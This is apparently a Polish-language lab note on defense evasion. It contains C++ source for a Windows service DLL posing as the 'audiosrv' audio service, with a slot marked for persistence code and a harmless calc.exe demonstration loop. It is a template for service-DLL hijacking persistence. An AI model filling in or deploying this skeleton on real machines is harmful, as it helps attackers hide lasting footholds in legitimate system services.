---
title: "calc audiosrv DLL"
folder: "07. Defense Evasion/Pliki Pomocnicze"
---


#include "pch.h"
#define SVCNAME TEXT("audiosrv")  

#include <Windows.h>
#include <fstream>
#include <chrono>
#include <ctime>
#include <thread>
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;

VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_PAUSE:
        serviceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        serviceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }

    UpdateServiceStatus(SERVICE_RUNNING);

    return NO_ERROR;
}

VOID ExecuteServiceCode()
{
    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    UpdateServiceStatus(SERVICE_RUNNING);

    // #####################################
    // your persistence code here
    // #####################################
     
    while (1)
    {
        // Sprawdź wartość w pliku
        std::ifstream inputFile("C:\\Users\\User\\Desktop\\status.txt");
        int value = 0;
        if (inputFile.is_open())
        {
            inputFile >> value;
            inputFile.close();
        }

        // Jeśli wartość w pliku to 1, zastąp ją wartością 0
        if (value == 1)
        {
            std::ofstream outputFile("C:\\Users\\User\\Desktop\\status.txt");
            if (outputFile.is_open())
            {
                outputFile << "calc.exe";
                outputFile.close();
            }
        }

        // Poczekaj minutę przed kolejnym odczytem
        std::this_thread::sleep_for(std::chrono::minutes(1));
        DWORD result = WaitForSingleObject(stopEvent, 0);
        if (result == WAIT_OBJECT_0) {
            UpdateServiceStatus(SERVICE_STOPPED);
            return;
        }
    }
}

extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}